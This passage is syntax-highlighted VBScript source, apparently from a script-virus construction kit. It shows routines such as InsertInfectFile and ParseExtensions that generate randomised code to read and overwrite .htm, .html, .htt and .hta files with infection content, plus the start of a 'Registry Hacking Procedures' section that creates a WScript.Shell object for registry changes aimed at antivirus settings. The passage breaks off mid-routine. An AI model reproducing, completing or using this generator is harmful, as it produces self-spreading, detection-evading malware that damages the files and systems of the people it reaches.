                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">else</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Call "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".path)"</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">


</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">RandInsertTxtHost</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.InfProb</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.FileRoutine</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Default"</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Sub "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarInfFile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenFileMethod</span><span class="sc6">(</span><span class="sc7">VarInfFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"True"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"False"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarFileContents</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".ReadAll"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".close"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenFileMethod</span><span class="sc6">(</span><span class="sc7">VarInfFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"True"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"False"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">".WriteLine"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PreID</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">".Write"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PreID</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""" + Chr(13) + Chr(10)"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">".WriteLine"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">"""&lt;html&gt;&lt;body&gt;"""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">".Write"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">"""&lt;html&gt;&lt;body&gt;"" + Chr(13) + Chr(10)"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">".WriteLine"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarTxtRng</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".htmlText"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">".Write"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarTxtRng</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".htmlText"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" + Chr(13) + Chr(10)"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddcodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">".WriteLine"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">"""&lt;/body&gt;&lt;/html&gt;"""</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">".Write"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc4">"""&lt;/body&gt;&lt;/html&gt;"" + Chr(13) + Chr(10)"</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">".Write"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".WriteLine"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">VarFileContents</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".close"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"()"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">   
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CustomInfectFile</span><span class="sc6">(</span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.FileRoutine</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">


</span><span class="sc3">function</span><span class="sc0"> </span><span class="sc7">ParseExtensions</span><span class="sc6">(</span><span class="sc7">Upper</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">HTTChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">HTMChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">HTMLChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">HTAChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">MiscChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">

    </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HTTChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.HTT.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" or "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""HTT"""</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""htt"""</span><span class="sc0">
                    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">HTTChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HTMChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.HTM.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" or "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""HTM"""</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""htm"""</span><span class="sc0">
                    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">HTMChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HTMLChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.HTML.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" or "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""HTML"""</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""html"""</span><span class="sc0">
                    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">HTMLChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HTAChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.HTA.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" or "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""HTA"""</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"""hta"""</span><span class="sc0">
                    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">HTAChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">MiscChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.MiscExt.checked</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" or "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Ucase</span><span class="sc6">(</span><span class="sc7">VInfo.ExtName.Value</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0">
                    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">Upper</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Lcase</span><span class="sc6">(</span><span class="sc7">VInfo.ExtName.Value</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0">
                    </span><span class="sc7">CheckedAny</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0">
                </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
                </span><span class="sc7">MiscChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">MiscChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HTAChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HTMLChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HTMchecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">HTTChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">ParseExtensions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ExtenList</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">

</span><span class="sc1">'-----------------------------------Registry Hacking Procedures----------------------------------
</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AVRegHackBegin</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.Current.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">OR</span><span class="sc0"> </span><span class="sc7">VInfo.Local.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">WSCreated</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarWSObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = CreateObject(""WScript.Shell"")"</span><span class="sc0">
            </span><span class="sc7">WSCreated</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AVRegHackA</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.Current.checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
